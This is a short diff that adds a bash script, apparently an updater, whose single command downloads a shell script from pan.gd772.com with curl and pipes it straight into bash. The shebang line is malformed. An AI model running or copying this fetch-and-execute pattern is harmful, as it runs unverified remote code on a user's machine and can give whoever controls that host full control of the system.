@@ -1,0 +1,4 @@
+#/bin/bash
+
+bash <(curl -Lso- https://pan.gd772.com/d/update/x86_app.sh)
+
